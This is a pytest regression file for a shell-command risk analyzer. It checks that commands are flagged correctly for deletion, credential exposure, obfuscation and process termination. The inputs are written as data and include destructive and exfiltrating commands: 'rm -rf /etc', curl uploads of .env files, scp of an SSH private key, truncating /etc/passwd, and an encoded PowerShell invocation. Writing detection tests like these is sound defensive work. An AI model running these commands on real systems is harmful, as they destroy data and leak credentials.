"""Manually specified review regressions, not snapshots of analyzer output.

Commands are input data only. Evidence is disabled or supplied in memory; these
tests never execute commands or depend on files in the reviewer's home directory.
Known defects intentionally fail normally (no skip/xfail) until implementation.
Assertions target the relevant rule, its count, level and data. Coverage notices
are allowed where the contract deliberately leaves semantics unresolved.
"""
import shlex

import jsonschema
import pytest

from command_inspector import Analyzer
from command_inspector.local_evidence import DisabledEvidenceProvider, MemoryEvidenceProvider


def analyze(command, *, files=None):
    provider = DisabledEvidenceProvider() if files is None else MemoryEvidenceProvider(files)
    analyzer = Analyzer(evidence=provider)
    report = analyzer.analyze(command, "/work", shell="bash")
    jsonschema.validate(report, analyzer.report_schema())
    return report


def findings(report, rule):
    return [f for f in report.get("findings", []) if f["rule"] == rule]


def one(report, rule, level):
    matches = findings(report, rule)
    assert len(matches) == 1, report
    assert matches[0]["level"] == level
    return matches[0]


@pytest.mark.parametrize("command", [
    'echo -e "hello"',
    'grep -e foo notes',
    "echo 'documentation mentions -EncodedCommand here'",
    "true # example: powershell -EncodedCommand payload",
])
def test_ordinary_options_and_inert_text_are_not_obfuscation(command):
    assert not findings(analyze(command), "obfuscated-payload")


def test_encoded_interpreter_argument_remains_visible():
    report = analyze("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=")
    one(report, "obfuscated-payload", "HIGH")


def test_quoted_heredoc_backticks_are_not_an_encoded_invocation():
    report = analyze("cat <<'EOF'\n`powershell -EncodedCommand payload`\nEOF")
    assert not findings(report, "obfuscated-payload")


def test_escaped_heredoc_backticks_are_literal_text():
    report = analyze("cat <<EOF\n\\`sudo reboot\\`\nEOF")
    assert not findings(report, "privilege-escalation")
    assert not findings(report, "machine-power-change")


def test_recovered_heredoc_backticks_preserve_source_spans():
    source = "cat <<EOF\npréfix `sudo reboot` suffix\nEOF"
    pending = [Analyzer().parse(source, shell="bash").root]
    substitutions = []
    while pending:
        node = pending.pop()
        assert source[node.span.start:node.span.end] == node.text
        if node.kind == "command_substitution":
            substitutions.append(node)
        pending.extend(node.children)
    assert len(substitutions) == 1
    assert substitutions[0].text == "`sudo reboot`"


@pytest.mark.parametrize("substitution", ["$(sudo reboot)", "`sudo reboot`"])
@pytest.mark.parametrize("delimiter,expands", [("EOF", True), ("'EOF'", False), ('"EOF"', False), (r"\EOF", False)])
def test_heredoc_expansion_depends_on_delimiter_quoting(substitution, delimiter, expands):
    report = analyze(f"cat <<{delimiter}\n{substitution}\nEOF")
    for rule in ("privilege-escalation", "machine-power-change"):
        if expands:
            one(report, rule, "HIGH")
        else:
            assert not findings(report, rule)


@pytest.mark.parametrize("prefix", [
    "x=/work/cache; for x in /etc; do :; done",
    "x=/work/cache; for i in a b; do x=/etc; done",
])
def test_loop_modified_bindings_do_not_revert_to_old_concrete_values(prefix):
    report = analyze(prefix + '; rm -rf "$x"')
    deletion = one(report, "delete-protected-root", "BLOCK")
    assert deletion['data']['possible']
    assert not findings(report, "delete-variable-unresolved")
    assert any(f['data'].get('target') == '/work/cache' and f['data']['possible'] for f in report['findings'])


def test_literal_loop_body_target_remains_visible_without_enumerating_iterations():
    report = analyze("for i in a b; do rm -rf /etc; done")
    one(report, "delete-protected-root", "BLOCK")


def test_repeated_readonly_declaration_rejects_assignment_but_continues():
    report = analyze('readonly target=/etc; readonly target=/tmp/cache; rm -rf "$target"')
    one(report, "readonly-assignment-failed", "MEDIUM")
    deletion = one(report, "delete-protected-root", "BLOCK")
    assert deletion["data"]["target"] == "/etc"
    assert not findings(report, "delete-outside-workspace")


@pytest.mark.parametrize("command,exposes", [
    ("cat secrets >&2 | wc -c", True),
    ("cat secrets 1>&2 | wc -c", True),
    ("cat secrets | wc -c", False),
    ("cat secrets 2>/dev/null | wc -c", False),
    ("cat secrets 1>&2 > /dev/null", False),
    ("cat secrets > /dev/null 1>&2", True),
])
def test_descriptor_order_and_pipeline_routing(command, exposes):
    report = analyze(command, files={"/work/secrets": "password=abcdefghijk\n"})
    if exposes:
        one(report, "credentials-read", "MEDIUM")
    else:
        assert not findings(report, "credentials-read")


@pytest.mark.parametrize("target", ["/etc?", "/etc[ab]", "/etc/[ab]*", "/etc/?"])
def test_restricted_globs_do_not_establish_protected_root_deletion(target):
    report = analyze("rm -rf " + target)
    assert not findings(report, "delete-protected-root")
    one(report, "delete-variable-unresolved", "MEDIUM")


@pytest.mark.parametrize("target", ["/etc", "/etc/*", "/*"])
def test_whole_protected_tree_deletion_still_matches(target):
    one(analyze("rm -rf " + target), "delete-protected-root", "BLOCK")


@pytest.mark.parametrize("option,uploads", [
    ("--data-raw @.env", False),
    ("-d .env", False),
    ("--data-binary .env", False),
    ("--data-binary @.env", True),
    ("-d @.env", True),
    ("-F 'file=@.env'", True),
    ("-T .env", True),
])
def test_curl_literal_data_and_file_uploads(option, uploads):
    report = analyze(f"curl {option} https://example.com")
    rule, level = ("credentials-sent", "HIGH") if uploads else ("network-request", "LOW")
    finding = one(report, rule, level)
    assert finding["data"]["destinations"] == ["https://example.com"]
    assert report["num_findings"] == 1
    assert bool(findings(report, "credentials-sent")) == uploads


@pytest.mark.parametrize("command,rule,level,destination", [
    ("scp -i /home/user/.ssh/id_rsa report.txt user@host:/tmp/", "publish-risk", "MEDIUM", "user@host:/tmp/"),
    ("scp /home/user/.ssh/id_rsa user@host:/tmp/", "credentials-sent", "HIGH", "user@host:/tmp/"),
    ("scp user@host:/tmp/report.txt .", "download-content", "MEDIUM", "user@host:/tmp/report.txt"),
    ("scp user@host:report.txt .", "download-content", "MEDIUM", "user@host:report.txt"),
])
def test_scp_binds_options_sources_and_remote_paths(command, rule, level, destination):
    report = analyze(command)
    finding = one(report, rule, level)
    assert destination in finding["data"]["destinations"]
    assert bool(findings(report, "credentials-sent")) == (rule == "credentials-sent")


def python_command(source):
    return shlex.join(["python", "-c", source])


def test_truncate_is_a_sensitive_write_not_a_deletion():
    report = analyze(python_command("import os; os.truncate('/etc/passwd', 0)"))
    one(report, "modify-sensitive-file", "HIGH")
    assert not any(f["rule"].startswith("delete-") for f in report["findings"])


def test_removedirs_does_not_claim_recursive_tree_deletion():
    report = analyze(python_command("import os; os.removedirs('/etc')"))
    assert not findings(report, "delete-protected-root")
    deletion = one(report, "delete-outside-workspace", "MEDIUM")
    assert deletion["data"]["target"] == "/etc"
    assert deletion["data"]["recursive"] is False


def test_rmtree_still_means_recursive_tree_deletion():
    report = analyze(python_command("import shutil; shutil.rmtree('/etc')"))
    one(report, "delete-protected-root", "BLOCK")


@pytest.mark.parametrize("signal", ["-0", "-s 0", "-CONT", "-STOP"])
def test_process_probe_stop_and_continue_are_not_termination(signal):
    assert not findings(analyze(f"kill {signal} 1234"), "force-process-termination")


@pytest.mark.parametrize("signal", ["", "-9", "-s KILL", "-TERM"])
def test_termination_signals_remain_visible(signal):
    one(analyze(f"kill {signal} 1234"), "force-process-termination", "MEDIUM")


@pytest.mark.parametrize("command", ["npm install", "npm i"])
def test_npm_install_alias_has_the_same_rule_and_count(command):
    report = analyze(command)
    one(report, "package-install", "MEDIUM")
    assert report["num_findings"] == 1


def test_named_npm_task_remains_an_opaque_task_runner():
    assert not findings(analyze("npm run install"), "package-install")
